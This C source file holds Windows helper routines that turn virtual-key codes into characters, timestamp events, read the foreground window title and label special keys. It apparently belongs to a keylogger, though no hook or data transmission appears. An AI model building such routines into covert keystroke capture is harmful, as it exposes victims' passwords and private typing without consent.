#include "../winkey.h"


int vk_to_char(DWORD vkCode, char *out)
{
	BYTE keyboardState[256];
	if (!GetKeyboardState(keyboardState))
		return 0;
	HKL layout = GetKeyboardLayout(0);
	UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);
	WCHAR unicodeChar[5] = {0};
	int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeChar, 4, 0, layout);
	if (result > 0)
	{
		out[0] = (char)unicodeChar[0];
		out[1] = '\0';
		return 1;
	}
	return 0;
}


void get_time(char *buf)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d",st.wYear, st.wMonth, st.wDay,st.wHour, st.wMinute, st.wSecond);
}

void get_window_title(char *title)
{
	HWND hwnd = GetForegroundWindow();
	if (hwnd)
		GetWindowTextA(hwnd, title, 256);
}


char *special_touch(DWORD vk)
{
	switch (vk)
	{
		case VK_RETURN: 
			return "ENTER";
		case VK_SPACE: 
			return "SPACE";
		case VK_TAB: 
			return "TAB";
		case VK_BACK: 
			return "BACKSPACE";
		case VK_SHIFT: 
			return "SHIFT";
		case VK_LSHIFT: 
			return "LSHIFT";
		case VK_RSHIFT: 
			return "RSHIFT";
		case VK_CONTROL: 
			return "CTRL";
		case VK_LCONTROL: 
			return "LCTRL";
		case VK_RCONTROL: 
			return "RCTRL";
		case VK_MENU: 
			return "ALT";
		case VK_LMENU: 
			return "LALT";
		case VK_RMENU: 
			return "RALT";
		case VK_ESCAPE: 
			return "ESC";
		case VK_LEFT: 
			return "LEFT";
		case VK_RIGHT: 
			return "RIGHT";
		case VK_UP: 
			return "UP";
		case VK_DOWN: 
			return "DOWN";
		case VK_F1: 
			return "F1";
		case VK_F2: 
			return "F2";
		case VK_F3: 
			return "F3";
		case VK_F4: 
			return "F4";
		case VK_F5: 
			return "F5";
		case VK_F6: 
			return "F6";
		case VK_F7: 
			return "F7";
		case VK_F8: 
			return "F8";
		case VK_F9: 
			return "F9";
		case VK_F10: 
			return "F10";
		case VK_F11: 
			return "F11";
		case VK_F12: 
			return "F12";
	}
	return NULL;
}
